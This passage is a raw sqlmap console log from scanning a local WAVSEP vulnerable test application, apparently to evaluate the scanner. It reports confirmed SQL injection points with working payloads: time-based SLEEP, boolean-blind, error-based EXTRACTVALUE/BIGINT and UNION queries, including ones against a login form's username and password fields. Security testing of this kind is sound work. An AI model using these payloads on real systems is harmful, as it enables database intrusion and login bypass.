[04:59:57] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:59:57] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:59:57] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:59:57] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:59:57] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:59:57] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:59:57] [INFO] checking if the injection point on GET parameter 'transactionDate' is a false positive
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2905 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02' AND (SELECT 7189 FROM (SELECT(SLEEP(5)))Rzwi)-- noQp
---
do you want to exploit this SQL injection? [Y/n] Y
[05:00:52] [INFO] the back-end DBMS is MySQL
[05:00:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[45/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionId=895
do you want to test this URL? [Y/n/q]
> Y
[05:00:52] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionId=895'                                                                                    
[05:00:52] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=AC3B17AAEFA...3D5CECB505'). Do you want to use those [Y/n] Y
[05:00:53] [INFO] testing if GET parameter 'transactionId' is dynamic
[05:00:53] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[05:00:53] [WARNING] heuristic (basic) test shows that GET parameter 'transactionId' might not be injectable
[05:00:53] [INFO] testing for SQL injection on GET parameter 'transactionId'
[05:00:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:00:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:00:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:00:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:00:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:00:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:00:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:00:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:00:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:00:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:00:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:00:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:00:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:00:54] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:00:55] [INFO] testing 'Generic inline queries'
[05:00:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:00:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:00:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:00:55] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:00:55] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:00:55] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:00:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:00:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:00:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:00:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:00:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:00:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:00:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:00:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:00:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:00:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:00:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:00:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:00:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:00:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:00:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:00:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:00:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:00:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:00:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:00:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:00:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:00:58] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:00:58] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:00:58] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:00:58] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:00:58] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:00:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:00:59] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:00:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:00:59] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:00:59] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:00:59] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:00:59] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:01:00] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:01:00] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:01:00] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:01:00] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:01:00] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:01:00] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:01:00] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:01:00] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:01:00] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:01:00] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:01:00] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:01:00] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:01:00] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:01:00] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:01:00] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:01:00] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:01:00] [INFO] testing 'MySQL inline queries'
[05:01:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:01:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:01:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:01:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:01:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:01:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:01:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:01:10] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:01:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:01:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:01:11] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:01:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:01:11] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:01:11] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:01:11] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:01:11] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:01:11] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:01:11] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:01:11] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:01:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:01:11] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:01:11] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:01:11] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:01:12] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:01:12] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:01:12] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:01:12] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:01:12] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:01:12] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[05:01:12] [INFO] checking if the injection point on GET parameter 'transactionId' is a false positive
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2894 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=895 AND (SELECT 6689 FROM (SELECT(SLEEP(5)))UYdQ)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:02:12] [INFO] the back-end DBMS is MySQL
[05:02:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[46/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[05:02:12] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp?transactionDate=2010-02-02'                                                                              
[05:02:12] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=0CA447A4ABA...BC1286A11D'). Do you want to use those [Y/n] Y
[05:02:12] [INFO] testing if GET parameter 'transactionDate' is dynamic
[05:02:12] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[05:02:12] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[05:02:12] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[05:02:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:02:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:02:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:02:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:02:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:02:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:02:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:02:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:02:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:02:14] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:02:14] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:02:14] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:02:14] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:02:14] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:02:14] [INFO] testing 'Generic inline queries'
[05:02:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:02:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:02:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:02:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:02:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:02:15] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:02:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:02:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:02:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:02:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:02:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:02:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:02:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:02:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:02:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:02:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:02:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:02:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:02:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:02:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:02:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:02:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:02:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:02:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:02:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:02:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:02:17] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:02:17] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:02:18] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:02:18] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:02:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:02:18] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:02:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:02:18] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:02:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:02:19] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:02:19] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:02:19] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:02:19] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:02:19] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:02:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:02:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:02:20] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:02:20] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:02:20] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:02:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:02:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:02:20] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:02:20] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:02:20] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:02:20] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:02:20] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:02:20] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:02:20] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:02:20] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:02:20] [INFO] testing 'MySQL inline queries'
[05:02:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:02:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:02:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:02:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:02:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:02:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:02:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:02:20] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:02:30] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' injectable 
[05:02:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:02:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:02:30] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:02:31] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:02:31] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:02:31] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:02:31] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:02:31] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:02:31] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:02:31] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:02:31] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:02:31] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:02:31] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:02:31] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:02:31] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:02:31] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:02:32] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:02:32] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:02:32] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:02:32] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:02:32] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[05:02:32] [INFO] checking if the injection point on GET parameter 'transactionDate' is a false positive
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2964 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02 OR (SELECT 4893 FROM (SELECT(SLEEP(5)))cgPk)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:03:32] [INFO] the back-end DBMS is MySQL
[05:03:32] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[47/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=readme&target=a@a.com
do you want to test this URL? [Y/n/q]
> Y
[05:03:32] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=readme&target=a@a.com'                                                              
[05:03:32] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=DB2B80B8073...FB0D630D82'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=readme' RLIKE (SELECT (CASE WHEN (4041=4041) THEN 0x726561646d65 ELSE 0x28 END)) AND 'Fnwq'='Fnwq&target=a@a.com

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: msg=readme' AND EXTRACTVALUE(2174,CONCAT(0x5c,0x7162767071,(SELECT (ELT(2174=2174,1))),0x717a6b6271)) AND 'BxBI'='BxBI&target=a@a.com

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: msg=readme' RLIKE SLEEP(5) AND 'qdCu'='qdCu&target=a@a.com
---
do you want to exploit this SQL injection? [Y/n] Y
[05:03:32] [INFO] testing MySQL
[05:03:32] [INFO] confirming MySQL
[05:03:32] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.0
[48/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue&password=textvalue2
do you want to test this URL? [Y/n/q]
> Y
[05:03:32] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue&password=textvalue2'                                                                                         
[05:03:32] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=48CB589BA05...6002D9F4E0'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=textvalue' OR NOT 6623=6623-- KSwG&password=textvalue2

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: username=textvalue' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71766a7871,(SELECT (ELT(2613=2613,1))),0x7170767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- rJTx&password=textvalue2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue' AND (SELECT 9640 FROM (SELECT(SLEEP(5)))uSgL)-- XmoK&password=textvalue2

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=textvalue' UNION ALL SELECT CONCAT(0x71766a7871,0x6845564d73714c4153564a415947547550755955456b73655172554e7372434c444a656d5444796f,0x7170767a71),NULL-- -&password=textvalue2

Parameter: password (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=textvalue&password=textvalue2' OR NOT 8129=8129-- sPhJ

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: username=textvalue&password=textvalue2' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71766a7871,(SELECT (ELT(2504=2504,1))),0x7170767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- UDVe

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue&password=textvalue2' AND (SELECT 6771 FROM (SELECT(SLEEP(5)))OsaX)-- dIKY
---
there were multiple injection points, please select the one to use for following injections:
[0] place: GET, parameter: username, type: Single quoted string (default)
[1] place: GET, parameter: password, type: Single quoted string
[q] Quit
> 0
do you want to exploit this SQL injection? [Y/n] Y
[05:03:32] [INFO] testing MySQL
[05:03:32] [INFO] confirming MySQL
[05:03:32] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.0
[05:03:32] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[49/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp?msg=textvalue
do you want to test this URL? [Y/n/q]
> Y
[05:03:32] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp?msg=textvalue'                                                                                                                
[05:03:32] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=DE1BFB11F19...682D1508A4'). Do you want to use those [Y/n] Y
